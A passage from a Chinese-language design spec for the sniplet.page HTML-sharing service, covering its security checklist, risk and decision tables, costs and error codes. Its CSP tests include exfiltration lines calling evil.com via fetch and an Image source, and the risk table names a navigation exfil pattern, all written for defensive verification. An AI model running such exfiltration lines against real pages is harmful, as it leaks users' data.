**樣式**:系統字、最大寬度 720px、左右留白;排版以易讀為主。

### 10.8 security.txt(`sniplet.page/.well-known/security.txt`)

**目的**:RFC 9116 標準,供自動化工具(bug bounty scanner、researcher tooling)發現安全回報窗口。

**HTTP 行為**:`GET /.well-known/security.txt` → `200 text/plain`,`Cache-Control: public, max-age=86400`

**內容(純文字)**:

```
Contact: mailto:security@sniplet.page
Expires: 2027-04-21T00:00:00Z
Preferred-Languages: en, zh-TW
Canonical: https://sniplet.page/.well-known/security.txt
Policy: https://sniplet.page/security
```

**`Expires`**:RFC 9116 要求未來日期;RUNBOOK §5 每季檢查項目須包含「更新 security.txt 的 Expires 至少領先 1 年」。

**注意**:此檔內容無敏感資訊,無需 signed(`.asc` 版本)— v1 接受;若未來接收大量 automated report,再評估 PGP signing。

## 11. 成功指標(MVP 驗收 checklist)

### 功能面
- [ ] `api.sniplet.page` live、HTTPS OK
- [ ] **Wildcard DNS + SSL**:任意 `{slug}.sniplet.page` 可解析並提供 HTTPS
- [ ] `{slug}.sniplet.page/` 公開路由正常 + security headers 正確
- [ ] `sniplet.page/` Accept header 分流
- [ ] **永遠 postfix**:POST slug `q3-sales` → response slug 含 `-{4 chars}`
- [ ] Slug 撞 reserved subdomain → 400
- [ ] 私享 flow 端到端:POST → challenge → Turnstile → magic link → `/auth/verify` 確認頁 → `/auth/consume` → cookie → serve
- [ ] **Cookie scope**:Set-Cookie 含 `Domain=sniplet.page`,browser devtools 確認 cookie 會送到多個 subdomain
- [ ] **跨 sniplet session 重用**:Alice 驗過 sniplet A,去 sniplet B(Alice 在 B 的 viewers 白名單)→ 直接 serve,不走 magic link
- [ ] Strategy C 驗證:未授權 email 提交 → 回 200 但不收信
- [ ] PATCH viewers 跨 mode:public → add → email-gated;email-gated → remove 全部 → public
- [ ] DELETE 後立刻 GET 應回 404
- [ ] Email index:新建 gated sniplet 後,`/auth/request` 能查到 email
- [ ] Analytics Engine:至少 1 筆 event 寫入成功
- [ ] HTML > 1MB → 400 invalid_format
- [ ] Bot Fight Mode 在 dashboard 已啟用
- [ ] SKILL.md 在 public GitHub repo
- [ ] Claude.ai + Claude Code 實測 happy path 通
- [ ] 至少一筆 public + 一筆 gated 實測通過
- [ ] `POST /auth/logout` 清 cookie 生效(確認帶 Domain=sniplet.page)
- [ ] **`POST /auth/logout` CSRF 防護(S-6)**:curl 不帶 Origin 或帶 `Origin: https://evil.com` → 400 `invalid_origin`;`Origin: https://sniplet.page` → 200
- [ ] **UX 實測:`{slug}.sniplet.page` URL 在 LINE / Slack / WhatsApp / iMessage 可 auto-link**(v0.8.10 新增)

### 安全面
- [ ] **P0 SOP cross-sniplet isolation**:建 sniplet A 塞 JS `fetch('https://other-sniplet-xxx.sniplet.page/')` → response 被 browser SOP 擋(無 CORS → opaque response)
- [ ] **P0 Subdomain origin 隔離**:A 的 JS `window.open('https://other-sniplet-xxx.sniplet.page/')` → `w.document` throw DOMException
- [ ] **P0 CSP enforced**:sniplet HTML 塞 `fetch('https://evil.com/')` → 被 CSP `connect-src 'none'` 擋;`new Image().src = 'https://evil.com/?' + data` → 被 `img-src` 擋(non-data URI)
- [ ] **P0 CSP allowlist**:sniplet 載 `<script src="https://cdn.jsdelivr.net/...">` 可正常執行;載非 allowlist CDN → 被擋
- [ ] **P0 Magic link one-shot**:`/auth/consume` 同一 token 送第二次 → 422 `already_consumed`
- [ ] **P0 Email scanner 模擬**:curl `GET /auth/verify?t=<valid-token>&r=...` → 回 HTML 確認頁,token 仍可後續被 `/auth/consume` 消耗一次
- [ ] **P0 IP HMAC**:`IP_HASH_SECRET` 已設;KV key 格式為 `ip_quota:<hmac>:<date>`;meta.json `ip_hash` 為 HMAC 輸出
- [ ] **P0 Cookie Domain=sniplet.page**:`Set-Cookie` 的 session cookie **有** `Domain=sniplet.page`(與 v0.8.9 的 host-only 相反);`/auth/logout` 亦有
- [ ] **P0 /auth/request timing**:實測 hit 與 miss path response latency 差 < 20ms(curl + timing loop 各 100 次,取中位數)
- [ ] **P0 /auth/request per-IP**:同 /64 源 31 次 `/auth/request` → 第 31 次回 429
- [ ] **P0 CSP violation reporting**:CSP 違規時 `/v1/csp-report` 收到,Analytics Engine 有 `csp_violation` event
- [ ] **P1 JWT purpose**:用 magic link token 當 session cookie → 拒絕
- [ ] **P1 return_to 驗證**:`/auth/consume` 傳 `r=https://evil.com/` → redirect 設為 `https://sniplet.page/`,不是 evil.com
- [ ] **P1 return_to 驗證**:傳 `r=https://q3-xxx.sniplet.page/?xss=<script>` → 拒絕(含 query)
- [ ] **P1 Email 正規化**:`Alice@CO.com` 與 `alice@co.com` 查詢命中同筆 KV
- [ ] **P1 Per-IP sniplet rate limit**:同 IP 連建 51 個 sniplets → 第 51 個回 429
- [ ] **P1 Email HMAC salt**:`EMAIL_HASH_SECRET` 已設且 KV key 格式為 `viewer:<hmac>`
- [ ] **P0 meta.viewers HMAC 儲存(F-11)**:POST 後檢查 R2 meta.json,`viewers` 為 `[{h, m}]` 結構,無明文 email;PATCH add/remove 接受明文但 server HMAC 比對後更新;response 只回 `viewers_masked`
- [ ] **P0 JWT sub HMAC(F-11)**:實測 cookie decode 後 `sub` 欄位為 HMAC-SHA256 hex / base64,不是明文 email;跨 sniplet session 重用測試時,server 以 HMAC 比對 `meta.viewers[].h`
- [ ] **P1 IPv6 /64 normalize**:同 /64 但不同 /128 的 51 個 IPv6 連測 → 第 51 次回 429
- [ ] **P1 JWT secret 拆分**:`SESSION_JWT_SECRET` 與 `MAGIC_JWT_SECRET` 為不同值;用 magic secret 簽的 token 拿去當 session 驗證 → 拒絕
- [ ] **P1 JWT HS256 enforce**:library 設定 enforce `HS256`;`alg: "none"` / asymmetric token 會被 reject
- [ ] **P1 Resend alert**:Analytics Engine 有 `resend_send_failed` event schema;dashboard alert 閾值已設
- [ ] **P1 owner_token constant-time**:code review 確認 token 比對使用 `node:crypto` 的 `timingSafeEqual` 或等效手寫 constant-time loop;**禁用** `===` / `==` / `Buffer.compare`。**註**:`crypto.subtle.timingSafeEqual` 不存在於 Web Crypto,不可使用
- [ ] **P1 CF Log Push hygiene**:ops 確認 CF Log Push 未啟用,或 `Authorization` header 在 drop list
- [ ] **P2 Cron alert**:Analytics Engine 有 `cron_cleanup_success` event;dashboard 有「24hr 無 event → alert」
- [ ] **P2 DNSSEC + CAA**:`dig +short DS sniplet.page` 有回傳;`dig CAA sniplet.page` 有回傳
- [ ] **P2 Doc**:`RUNBOOK.md` 已在 ops repo 根目錄;`/security` page + `/.well-known/security.txt` 已 live 且 `security.txt` 的 `Expires` 領先至少 1 年
- [ ] **P2 Slug postfix random**:code review 確認用 `crypto.getRandomValues()`,非 counter / timestamp
- [ ] **P2 meta.json 無 `ua`**:POST 後檢查 R2 meta.json,無 `ua` 欄位
- [ ] **P2 SW registration 擋下**:手動測試 `navigator.serviceWorker.register('/')` 應失敗(MIME check)
- [ ] **P2 Rate limit window 類型**:code review 確認 per-IP 走 fixed UTC day、per-email hour 走 fixed hour bucket
- [ ] **P2 Logging hygiene**:檢查 Worker logs 與 Analytics Engine,無 owner_token、JWT、明文 email、IP、CSP blocked-uri 明文
- [ ] **P1 `/auth/request` 全站 cap(F-32)**:模擬 101 次合法 hit(跨多個 IP / email 拆散 per-email 與 per-IP rate limit)→ 第 101 次回 503 `service_unavailable`;Analytics 有 `auth_global_cap_hit` event
- [ ] **P1 Owner 操作 slug enumeration(F-33)**:`DELETE /v1/sniplets/<nonexistent-slug>` with any token → 401 `invalid_token`;response 與「existing slug + wrong token」的 401 完全相同(包含 latency < 5ms 差距)
- [ ] **P1 R2 create-only(F-34)**:code review 確認 `SNIPLETS.put` 使用 `onlyIf: { etagDoesNotMatch: '*' }`;unit test 模擬 `PreconditionFailed` 可正確觸發 postfix retry

## 12. 關鍵風險

| # | 風險 | Mitigation |
|---|------|-----------|
| 1 | Phishing / spam 跳板 | 7 天 TTL、CF 邊緣 WAF、Turnstile、rate limit、**永遠 postfix** 防品牌挪用、**CSP `form-action 'none'`** 擋 phishing 表單 |
| 2 | Cloudflare / Resend 爆量費用 | 每日 1000 sniplets hard cap、per-IP 50/day、Resend 3000 封免費 |
| 3 | Anthropic/OpenAI 自己做 public URL | 跨 agent 通用 + 私享是差異化護城河 |
| 4 | Skill 在某些 harness 不穩 | MVP 只保證 Claude.ai + Claude Code |
| 5 | **Subdomain URL 在某些 messaging app auto-link 失敗** | v0.8.10 ship 前實測 LINE/Slack/WhatsApp/iMessage;若有 app 失敗則需於 SKILL.md 提示使用者補 `https://` |
| 6 | ~~跨 sniplet 洩漏(same-origin credential-bearing fetch)~~ | **subdomain-per-sniplet 架構 + SOP 天然解決**(v0.8.10 整組移除 Fetch Metadata / COOP) |
| 7 | Magic link 被攔截 / 重放 | 15 分鐘短期 + HTTPS only + **one-shot token via MAGIC_CONSUMED_KV** + 強制 `purpose === "magic"`。**Replay 風險 v1 已解**(one-shot) |
| 8 | 合法 email 被濫發騷擾 / DoS viewer quota | Turnstile + per-email rate limit + **per-IP rate limit 30/day on `/auth/request`**(v0.8.10 加) |
| 9 | Email enumeration | Strategy C |
| 10 | 移除 viewer 後 session 仍有效 | 下次 GET 時 server 比對會擋;v2 做 revoke list |
| 11 | 開發環境網路中斷 / vendor dashboard 臨時無法存取 | 重要 setup 在 implementation 前先完成 |
| 12 | ~~Cache invalidation 遺漏~~ | **v0.8.10 移除 edge cache,此風險消失** |
| 13 | EMAIL_INDEX_KV 一致性延遲 | KV eventually consistent,極罕見漏發 magic link 可接受 |
| 14 | iframe 嵌入汙染品牌 | `X-Frame-Options: DENY` + CSP `frame-ancestors 'none'`;subdomain 讓 iframe 目標更難猜 |
| 15 | JWT secret 洩漏 | `v` 欄位預留 rotation;logging hygiene(§7.22)避免 secret 入 log |
| 16 | Open redirect via `return_to` | §8 嚴格驗證邏輯(hostname 白名單、拒 query/fragment) |
| 17 | `owner_token` timing attack | Constant-time 比對(§7.14) |
| 18 | Email index 被 rainbow table 還原 | HMAC-SHA256 with `EMAIL_HASH_SECRET`(§7.10) |
| 19 | Single IP 吃光 daily cap | Per-IP 50 sniplets/day(§7.17) |
| 20 | ~~Viewer email 以明文存於 R2 meta.json~~ | **v0.8.11 F-11 升 v1**:`meta.viewers[]` 改存 `{ h: HMAC, m: masked }`;R2 外洩只 leak first-char + domain,不 leak 完整 email |
| 21 | HTML 內容以明文存於 R2(CF at-rest 加密對 CF operator 透明) | 接受 for v1;Privacy Policy 明示;v3+ 評估 E2E encryption |
| 22 | **Magic link token 在 URL query,會留 browser history / bookmark / clipboard;含 cloud-sync 放大效應** | **one-shot token 已根本解**(v0.8.10);即使 token 外洩,15 分鐘內若已被合法 viewer consume 則 replay 失敗 |
| 23 | Per-IP rate limit 可被並發繞過(KV eventually consistent) | Daily cap 1000 兜底;v2 升 CF Rate Limiting Rules |
| 24 | 404 vs 410 洩漏「slug 曾存在過」 | 統一改為 404(§7.21)— 永遠 postfix 進一步降低此 signal 價值 |
| 25 | Challenge page 文案揭示「此 sniplet 私享」 | v1 接受;postfix 讓 slug 無法被精準預測,部分 mitigation |
| 26 | Resend 靜默失敗導致合法 viewer 收不到信 | Analytics `resend_send_failed` + ops alert |
| 27 | Cron 失敗導致過期 sniplet 未清 | Analytics `cron_cleanup_success` + 24hr 無 event → alert |
| 28 | ~~Session cookie Domain 擴及未來子網域~~ | **v0.8.10 主動 `Domain=sniplet.page`** 讓 cookie 跨 sniplet 共享是 feature,不是風險;SOP 保證內容隔離 |
| 29 | IP hash 可被離線窮舉(IPv4 僅 2³²) | HMAC-SHA256 with `IP_HASH_SECRET` |
| 30 | `/auth/request` timing 洩漏 email 白名單 | `ctx.waitUntil()` defer Resend,兩 path latency 差 < 5ms |
| 31 | JWT secret 共用時 purpose 檢查漏抓 = session 偽造 | `SESSION_JWT_SECRET` / `MAGIC_JWT_SECRET` 拆分,purpose 檢查為第二層 |
| 32 | Secret 洩漏無 rotation runbook | `RUNBOOK.md` 完整 secret rotation flow(含 EMAIL_HASH_SECRET 的 dual-write migration) |
| 33 | Incident response / GDPR breach 通知無流程 | `/security` page(§10.7)含回報窗口 + safe harbor;GDPR Art 17 erasure v1 依 7 天 TTL 兜底,v2 ship Privacy Policy 時另開窗口 |
| 34 | ~~`window.open` 繞過 Fetch Metadata 讀私享 sniplet~~ | **subdomain 架構下 cross-origin window.open 被 SOP 擋,不需要 COOP**(v0.8.10) |
| 35 | IPv6 attacker 在 /64 空間旋轉 source address 繞過 per-IP quota | per-IP KV key 先 normalize /64 再 HMAC |
| 36 | ~~Edge cache stale window~~ | **v0.8.10 移除 edge cache,此風險消失** |
| 37 | ~~localStorage / IndexedDB 跨 sniplet 共用~~ | **subdomain 架構下每個 sniplet 自己的 storage origin**(v0.8.10) |
| 38 | **CSP 不擋 navigation exfil**(`location = evil + '?' + data`) | v1 接受;需要 viewer 主動點擊離開頁面,attack value 低、有社交工程 friction |
| 39 | **CDN supply chain**(allowlist 中的 jsdelivr/cdnjs/unpkg 被 compromise) | 接受此風險;若出現 incident,緊急更新 CSP 移除該 CDN 並觀察 `csp_violation` rate |
| 40 | **Email security scanner 預取 `/auth/verify`** | **兩段式 auth + one-shot token 已根本解**(v0.8.10);scanner 做 GET 只會看到 HTML 確認頁,不會觸發 consume |
| 41 | **Team tier 內互信假設破裂**(v2 Team tier 未來) | v2 設計時重新引入 Fetch Metadata 等軟體層防線 for intra-team;v0.8.10 know-how 留存 |
| 42 | **Session cookie 外洩無 per-user revocation**(v0.8.11 S-4b F-29 新增) | Cookie 被 malware / 裝置遺失偷走,30 天內攻擊者可讀 Alice 白名單內的私享 sniplet(read-only;無法 create/delete/PATCH)。嚴重度 LOW。Mitigation:(a) Alice 自己 `/auth/logout` 清當前裝置 cookie;(b) Operator 走 RUNBOOK §2.2 `SESSION_JWT_SECRET` 輪換(nuclear,全體登出)作 last resort;(c) v2 做 JWT revoke list 提供 per-user 選項。此風險接受為 30 天 UX 的成本 |
| 43 | **`/auth/logout` CSRF**(v0.8.11 S-6 新增) | `SameSite=Lax` 不擋 logout CSRF(`Set-Cookie: Max-Age=0` 無條件生效);加 `Origin` header 檢查(§8 /auth/logout),合法源 `sniplet.page` / `*.sniplet.page` 才處理 |
| 44 | **Session cookie 散到 `api.sniplet.page`**(v0.8.11 S-3 新增) | Cookie `Domain=sniplet.page` 會被 browser 帶到 api subdomain,但 API 完全不使用 session cookie(只用 `Authorization: Bearer owner_token`)。Mitigation:§7.20 明示 API Worker MUST 忽略 `st` cookie、MUST NOT log `Cookie` header(§7.22);真實風險僅在「API 某天被誤用 log 了整包 headers」此紀律漏洞 |

## 13. 最終決策表

| # | 決策 | 選定 |
|---|------|------|
| 1 | 產品名稱 | **sniplet.page**(品牌=網域) |
| 2 | URL 結構 | **Subdomain-based**(`{slug}.sniplet.page`,v0.8.10 從 path-based 改) |
| 3 | Slug 來源 | **Agent 給** |
| 4 | Slug 衝突處理 | **永遠 postfix**(v0.8.10 從「衝突才 postfix」改) |
| 5 | Postfix 長度 | **4 字元** [a-z0-9] |
| 6 | TTL | **7 天** |
| 7 | owner_token | **MVP 就做**,32 bytes entropy |
| 8 | HTML footer 注入 | **不加** |
| 9 | Landing page | **另軌**(Claude Design) |
| 10 | Root `sniplet.page/` 行為 | **Accept header 分流** |
| 11 | Email-gated | **v1 免費、無 creator 配額** |
| 12 | Magic link 廠商 | **Resend** |
| 13 | 未授權 email | **Strategy C** |
| 14 | Email template | **B 乾淨有品**,主旨通用 |
| 15 | `POST /v1/sniplets` RL | **Daily cap 1000 全站 + per-IP 50/day** |
| 16 | 每日總量 cap | **1000 / day** |
| 17 | `/auth/request` RL | **Turnstile + 3/hr 10/day per email + 30/day per IP(v0.8.10 加)** |
| 18 | Cron 時間 | **UTC 02:00** |
| 19 | `claim_url` 預留 | **不預留** |
| 20 | Viewers 編輯 | **PATCH endpoint**,可跨 mode 切換 |
| 21 | GitHub repo URL | **TBD**(implementation 前定) |
| 22 | Viewers 上限 | **3 email / sniplet(Free)** |
| 23 | ~~Edge caching~~ | **v0.8.10 移除**(ROI 低 + invalidation 複雜度) |
| 24 | Email reverse index | **KV + HMAC-SHA256 with `EMAIL_HASH_SECRET`** |
| 25 | Analytics | **Workers Analytics Engine**(backend only) |
| 26 | 廣告 / 第三方追蹤 | **永不做** |
| 27 | Creator 認證 | **v2 與 Pro tier 一起做** |
| 28 | HTML 大小限制 | **1MB** |
| 29 | Stack | **TypeScript on Cloudflare Workers** |
| 30 | HTTP security headers | **XFO DENY + X-Content-Type-Options + Referrer-Policy + HSTS**(v0.8.10 `CSP frame-ancestors` 改由統一 CSP 處理) |
| 31 | 失敗 GET 的 IP rate limit | **不做** |
| 32 | 純自訂 slug(strict mode) | **v2 Pro tier 付費功能** |
| 33 | ~~跨 sniplet 洩漏防護(P0)~~ | **subdomain architecture + SOP 天然解決**(v0.8.10;整組刪除 Fetch Metadata / COOP / 相關 checklist) |
| 34 | **JWT purpose 驗證** | **強制 `purpose` 欄位比對** |
| 35 | **return_to 驗證** | **嚴格 hostname 白名單(含 postfix 格式)** |
| 36 | **owner_token 比對** | **Constant-time**(`node:crypto.timingSafeEqual` 或手寫;**非** `crypto.subtle.timingSafeEqual` 該 API 不存在) |
| 37 | **Email 正規化** | **lowercase + trim 後 HMAC** |
| 38 | **Logout endpoint** | **`POST /auth/logout` v1 做** |
| 39 | **Logging hygiene** | **§7.22 明列 + CF Log Push hygiene** |
| 40 | **IP hash 演算法** | **HMAC-SHA256 with `IP_HASH_SECRET`** |
| 41 | **Session cookie Domain** | **`Domain=sniplet.page`**(v0.8.10 從 host-only 改;讓 cookie 跨 `*.sniplet.page` 共享,SOP 保證內容隔離) |
| 42 | **`/auth/request` Resend 呼叫方式** | **`ctx.waitUntil()` defer** |
| 43 | **JWT secret 拆分** | **`SESSION_JWT_SECRET` + `MAGIC_JWT_SECRET`** |
| 44 | **X-Frame-Options** | **DENY** |
| 45 | **過期 sniplet status code** | **404** |
| 46 | **Ops monitoring** | **Resend / cron / daily_cap / rate_limit / csp_violation / auth_consumed replay 六類 alert** |
| 47 | **Doc 交付** | **`RUNBOOK.md`(ops 私藏)+ `/security` page + `/.well-known/security.txt`(公開於網站)** |
| 48 | ~~私享 sniplet COOP~~ | **v0.8.10 移除**(subdomain 下 cross-origin window.open 被 SOP 擋) |
| 49 | **IPv6 per-IP normalize** | **/64** |
| 50 | ~~Edge cache TTL~~ | **v0.8.10 移除 edge cache** |
| 51 | **JWT 演算法** | **`HS256`** enforce |
| 52 | **meta.json `ua` 欄位** | **拿掉** |
| 53 | **Slug postfix 產生方式** | **`crypto.getRandomValues()`** |
| 54 | **Subdomain architecture**(v0.8.10 加) | **`{slug}.sniplet.page`**;wildcard DNS + Universal SSL(免費)一層 wildcard |
| 55 | **Slug 永遠 postfix**(v0.8.10 加) | 即使 slug 唯一也加 4 字元 postfix;防品牌挪用與 phishing 混淆 |
| 56 | **統一嚴格 CSP**(v0.8.10 加) | 所有 sniplet 共用;`connect-src 'none'`、CDN allowlist 三家(jsdelivr/cdnjs/unpkg);img 限 data/blob;定位為 per-sniplet sandbox + platform abuse 防線,**非** cross-sniplet isolation(那是 subdomain + SOP) |
| 57 | **兩段式 auth + one-shot token**(v0.8.10 加) | `GET /auth/verify` 顯示確認頁不 consume;`POST /auth/consume` 實際驗證;`MAGIC_CONSUMED_KV` 防 replay;防 email scanner 預取 |
| 58 | **Status page**(v0.8.10 加) | **v1 不做**,SEV 事件透過 GitHub repo `README.md` Known Issues 段落公告;v2 評估 instatus |
| 59 | **CF Log Push hygiene**(v0.8.10 加) | ops setup 必須確認未啟用,或 `Authorization` header 在 drop list |
| 60 | **Viewer email HMAC 儲存**(v0.8.11 加,F-11 升 v1) | `meta.viewers[]` 存 `{ h: HMAC, m: masked }`;JWT `sub` 亦為 HMAC;R2 / cookie 外洩不等於 email 外洩 |
| 61 | **Public security policy 載體**(v0.8.11 加) | 取消 `SECURITY.md` 交付檔;改以 `sniplet.page/security`(§10.7)+ `/.well-known/security.txt`(§10.8 RFC 9116)公開,符合 non-open-source SaaS 慣例 |
| 62 | **`/auth/logout` Origin check**(v0.8.11 加,S-6) | MUST 驗 `Origin` header 等於 `https://sniplet.page` 或 `https://*.sniplet.page` 的合法 postfixed slug;擋跨站 CSRF logout |
| 63 | **`/auth/request` 全站 send cap**(v0.8.12 加,F-32) | **B2:METER_KV counter + peek 在 whitelist lookup 前 + 503 loud fail**;cap 預設 100/day,對齊 Resend 免費 tier;僅在實際 send path 計數 |
| 64 | **Owner 操作 status code 統一**(v0.8.12 加,F-33) | **DELETE / PATCH 的 slug-not-found 與 token-mismatch 統一回 401**,消除 slug enumeration free oracle;驗證順序為「讀 meta → constant-time token 比對(miss 用 dummy hash)→ 通過再檢 expiry」 |
| 65 | **R2 寫入原子性**(v0.8.12 加,F-34) | **`put` 一律帶 `onlyIf: { etagDoesNotMatch: '*' }`**,`PreconditionFailed` 觸發 postfix retry;禁止「先 head 再 put」的 TOCTOU race 做法 |

## 14. 商業模式(v1 免費、v2 起分層)

### v1(MVP)
**全部免費**。包含所有 in-scope 功能(email-gate、多 viewers、7 天 TTL)。

目標:**驗證 PMF + 建立網絡效應**(viewer → creator 漏斗)。

### v2(分層)

| Tier | 月費 | 對象 | 功能增量(相對 Free) |
|------|------|------|----------------------|
| **Free** | $0 | 個人輕用 | v1 所有功能、7 天 TTL、3 viewers/sniplet |
| **Pro** | $5-8 | 個人重度 / 創作者 | 30 天 TTL、viewers 上限提升至 50(或無上限)、**純自訂 slug(no postfix)**、owner dashboard (stats)、Creator account(device flow) |
| **Team** | $12-16/user | B2B 團隊 | 上述 + team workspace、SSO、共用 viewers 白名單、審計 log、**`{team}.sniplet.page/{slug}` team subdomain**、SLA |

Enterprise tier(自訂網域、on-prem)另議,不在 v2 scope。

具體定價待市場測試。

**Pro 主要付費動機**:
1. 純自訂 slug(仍加 postfix 作為品牌保護,但 slug 部分無 server-side 衝突 postfix)
2. Long TTL(給長期需要的內容)
3. Dashboard 看 stats
4. 提升 viewers 上限

### 收入假設
- **Cloudflare 成本極低**(見 §15):egress 免費,爆紅不破產
- **Resend 是主要變動成本**:3000 封免費,超過升 Pro $20
- **Break-even 門檻**:幾個 Pro 用戶就 cover 早期成本
- **主要收入來自 Team**:B2B sales 路線,個人 Free 當漏斗

### 獲客邏輯
1. Creator 在 agent 產 HTML → 用 sniplet skill 分享
2. Receiver(可能是公司同事)點開 → 第一次見到 sniplet.page 品牌
3. Receiver 也開始用 → 變 creator → 公司內部擴散
4. 達一定使用量 → 推 Team workspace

**Viewer email 不作他用**,但 aggregate domain distribution 可作 B2B sales 的 lead signal(合法)。

### 不做的事
- ❌ 賣 viewer email 名單 / 意圖資料
- ❌ 注入第三方廣告 / GA
- ❌ 追蹤 cross-site behavior
- ❌ 在 sniplet 內容頁放任何 tracking script

## 15. 成本預估

### 單位成本參考

| 項目 | 免費額度 | 超過後 |
|------|---------|--------|
| Workers Requests | 10M/月(Paid $5) | $0.30 / M |
| R2 Storage(Standard) | 10 GB | $0.015 / GB-月 |
| R2 Class A(寫) | 1M/月 | $4.50 / M |
| R2 Class B(讀) | 10M/月 | $0.36 / M |
| KV Reads | 100k / 日 | $0.50 / M |
| KV Writes | 1k / 日 | $5.00 / M |
| Analytics Engine | 100k data points / 日 | Beta 免費 |
| Turnstile | 無限 | 免費 |
| Cron Triggers | 無限 | 免費 |
| **Egress bandwidth** | **全部免費**(Cloudflare 策略) | — |
| Resend | 3000 封 / 月 | Pro $20(50k 封)→ Scale $90(100k)→ 更高 |
| 網域 sniplet.page | — | ~$8 / 年 = $0.67 / 月 |

### 四個 Scenario(無 edge cache 情境)

**A. MVP(月 100 sniplets)**
- 1,000 views、20 gated、~60 magic link emails
- 全部在免費額度內
- **月成本:$0.67**(只有網域)

**B. 驗證(月 5,000 sniplets)**
- 50k views、1,500 gated、~4,500 emails
- Cloudflare:全免費(operations 遠低於 quota)
- Resend:超過 3k 免費 → 升 Pro $20
- **月成本:~$21**

**C. 成長(月 100,000 sniplets)**
- 2M views、30k gated、~90k emails
- Workers requests:2M + 100k + auth ≈ 2.5M,超過 Paid plan 10M 額度 → 升 Paid $5
- R2 Class A:100k writes(遠低 1M 額度)
- R2 Class B:2M reads(無 cache,直接讀 R2)→ $0.72
- KV:rate limit + index writes ≈ 500k reads、200k writes → 略超額度,KV reads $0.20、writes $1.00
- Resend:升 Scale ~$90
- **月成本:~$97**(Workers $5 + R2 reads $0.72 + Resend $90 + KV ~$1.5 + R2 storage ~$0.15 + 網域)

**D. 爆紅(月 1,000,000 sniplets)**
- 20M views、300k gated、~900k emails
- Workers:Paid $5 + 超額 12M × $0.30 = $3.60 → $9
- R2 storage:假設 1TB → $15
- R2 Class B:20M reads(無 cache)→ $7.2
- KV:~$5
- Resend:~$500(需 Enterprise 議價)
- **月成本:~$537**

### Break-even 分析

假設 Pro $7/月、Team $15/user/月:

| Scenario | 月成本 | Break-even 需要 |
|----------|-------|-----------------|
| B | $21 | **3 個 Pro 用戶** |
| C | $97 | 14 個 Pro,或 7 個 Team 座位 |
| D | $537 | 77 個 Pro,或 36 個 Team 座位 |

業界 freemium 轉化率約 2-5%。Scenario C(10 萬 sniplets、估幾千活躍 creator)保守估算 3% → 100+ 付費用戶,**月 loss 變成 $600-700 淨賺**。

### 關鍵洞察

1. **Cloudflare 成本曲線極平緩**:就算 Scenario D 月百萬 sniplets,CF 總成本 < $30,egress 免費是真的佛心
2. **Resend 是唯一真正的變動成本**:佔 Scenario D 的 93%。未來 v2 若想大幅降低,可評估自架 email
3. **付費門檻極低**:從 Scenario B 開始,3-5 個 Pro 就打平
4. **移除 edge cache 的成本影響**:Scenario C 多 $0.72、Scenario D 多 $7 左右,**全在 noise 範圍**。cache 的 invalidation 複雜度(尤其 edge-local `cache.delete` 的 stale window)遠超省下的這點錢,v0.8.10 決定拿掉是對的

## 16. 錯誤碼總表(SSOT)

**說明**:所有 API 錯誤的 single source of truth。實作時以此為準;若與前面章節矛盾,以本章為主並回報 diff。

### 通用 Error Response 格式

所有錯誤回應(HTTP 4xx/5xx)統一 JSON 結構:

```json
{
  "error": "<machine_readable_code>",
  "message": "<human_readable_explanation>",
  "details": { /* optional, error-specific */ }
}
```

**例外**:
- 204 No Content 無 body
- `GET /auth/verify` 永遠回 HTML 確認頁(無錯誤)
- `GET /` on `{slug}.sniplet.page` 無權限回 challenge page HTML,HTTP 200

### POST `/v1/sniplets`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 400 | `invalid_format` | slug 格式不符;HTML > 1MB;viewers email 格式錯 |
| 400 | `reserved_slug` | slug 加 postfix 後撞 reserved subdomain |
| 400 | `viewers_exceeded` | viewers 超過 3 |
| 400 | `viewers_empty` | viewers 傳了 `[]` |
| 429 | `rate_limited` | 單一 IP 當日 50 個 sniplets 用盡 |
| 451 | `blocked_content` | abuse 偵測觸發 |
| 500 | `slug_retry_exhausted` | postfix 5 次後仍衝突(極罕見) |
| 503 | `daily_cap_exceeded` | 當日全站 1000 cap |

**Success 200**:
```json
{
  "slug": "q3-sales-dashboard-a7k2",
  "url": "https://q3-sales-dashboard-a7k2.sniplet.page",
  "expires_at": "2026-04-25T14:30:00Z",
  "owner_token": "ot_...",
  "access": "public",
  "viewers_masked": ["a***@co.com"] | null
}
```

### PATCH `/v1/sniplets/:slug/viewers`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 400 | `invalid_format` | email 格式錯 |
| 400 | `viewers_exceeded` | add 後超過 3 |
| 400 | `empty_request` | add + remove 都空 |
| 401 | `invalid_token` | owner_token 缺失 / 錯誤 / slug 不存在(F-33 統一) |
| 410 | `expired` | sniplet 已過期(僅 valid token 驗證後可見) |

**Success 200**:
```json
{ "viewers_masked": ["a***@co.com", ...] | null, "access": "public" | "email-gated" }
```

### DELETE `/v1/sniplets/:slug`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 401 | `invalid_token` | token 缺失 / 錯誤 / slug 不存在(F-33 統一) |
| 410 | `expired` | sniplet 已過期(僅 valid token 驗證後可見) |

**Success**: 204 No Content

### GET `/` on `{slug}.sniplet.page`

| HTTP | Content-Type | 條件 | Response |
|------|-------------|------|----------|
| 200 | `text/html` | 公開 / 已驗證私享 | Serve HTML + security headers + CSP |
| 200 | `text/html` | 私享無 cookie / 驗失敗 | Challenge page |
| 404 | `text/html` | 不存在 / 已過期 | 404 頁(統一 "Not found") |

**Cache-Control**:一律 `no-store`(v0.8.10 移除 edge cache)

### POST `/auth/request`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 400 | `turnstile_failed` | Turnstile token 錯 |
| 400 | `invalid_format` | email 格式錯 / body 結構錯 |
| 429 | `rate_limited` | per-email hr/day 或 per-IP day 額度用盡 |
| 503 | `service_unavailable` | 全站 `auth_send_daily` cap 達到(F-32);peek 在 KV whitelist lookup 之前,雙 path 一致 |

**Success**: `200 { "status": "sent" }`(Strategy C:不論 email 是否在白名單)

### GET `/auth/verify?t=<token>&r=<return_to>`

- **永遠回 200**,內容為 HTML 確認頁
- **不 consume token**,不 set cookie
- Token / return_to 的驗證延遲到 `/auth/consume`

### POST `/auth/consume`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
| 400 | `invalid_format` | body 結構錯 |
| 401 | `invalid_token` | JWT 簽章 / purpose / algorithm 不符 |
| 410 | `token_expired` | JWT exp 過期 |
| 422 | `already_consumed` | jti 已在 MAGIC_CONSUMED_KV 中 |

**Success 200**:
```json
{ "redirect": "https://q3-private-m8f1.sniplet.page/" }
```

### POST `/auth/logout`

| HTTP | Error code | 觸發條件 |
|------|-----------|---------|
